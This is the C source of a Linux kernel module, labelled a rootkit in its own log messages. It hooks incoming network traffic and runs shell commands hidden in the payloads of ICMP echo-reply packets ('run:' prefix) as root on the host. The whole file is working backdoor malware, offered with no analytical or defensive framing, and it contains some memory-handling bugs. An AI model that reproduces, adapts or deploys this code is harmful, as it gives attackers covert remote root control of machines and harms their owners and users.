#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>

#define MAX_CMD_LEN 1976

static struct nf_hook_ops nfho;

typedef enum {
  RUN, 
  GET,
  BAD_COMMAND
} command_t;

#define COMMAND_NUM 2

typedef struct {
  struct work_struct work;
  char string[MAX_CMD_LEN];
} args_t;


static void work_handler(struct work_struct* work)
{
    args_t* args_ptr = container_of(work, args_t, work);


    char *argv[] = {"/bin/sh", "-c", args_ptr->string, NULL};
    char *envp[] = {"PATH=/bin:/sbin", NULL};

    printk(KERN_INFO "rootkit: working\n");

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    kfree(args_ptr);
}


static command_t parse_command(char* data)
{
    char* command_strings[COMMAND_NUM] = {"run:\0", "get:\0"};
    command_t commands[COMMAND_NUM] = {RUN, GET};
    uint i, shift, j;



    for (i = 0; i < COMMAND_NUM; i++) {

        shift = strlen(command_strings[i]);
        if (strncmp(data, command_strings[i], shift) != 0) {
            continue;
        }

        j = shift;
        while (true) {
            data[j - shift] = data[j];
            if (data[j] == '\0') {
                break;
            }
            j++;
        }
        return commands[i];
        
        

    }
    
    

    return BAD_COMMAND;

}




static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    unsigned char *i;
    int j = 0;

    args_t* args_ptr;

    command_t command;

    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);


    printk(KERN_INFO "rootkit: ckecking connection\n");


    if (iph->protocol != IPPROTO_ICMP) {
        printk(KERN_INFO "rootkit: bad protocol\n");
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHOREPLY) {
        printk(KERN_INFO "rootkit: bad request type\n");
        return NF_ACCEPT;
    }

    printk(KERN_INFO "rootkit: parsing command\n");

    args_ptr = kmalloc(sizeof(args_t), GFP_KERNEL);

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    j = 0;
    for (i = user_data; i != tail; ++i) {
        char c = *(char *)i;

        args_ptr->string[j] = c;
        j++;

        if (c == '\0')
            break;

        if (j == MAX_CMD_LEN) {
            args_ptr->string[j] = '\0';
            break;
        }

    }

    command = parse_command(args_ptr->string);

    switch (command) {
        case RUN:
            printk(KERN_INFO "rootkit: run command: %s \n", args_ptr->string);
            INIT_WORK(&args_ptr->work, work_handler);
            schedule_work(&args_ptr->work);
            break;
        case GET:
            printk(KERN_INFO "rootkit: get command: %s \n", args_ptr->string);
            break;
        default:
            printk(KERN_INFO "rootkit: mda\n");
            break;
    }



    return NF_ACCEPT;
}

static int __init startup(void)
{
    nfho.hook = icmp_cmd_executor;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
    printk(KERN_INFO "rootkit: started\n");
    return 0;
}

static void __exit cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "rootkit: finished\n");
}

MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);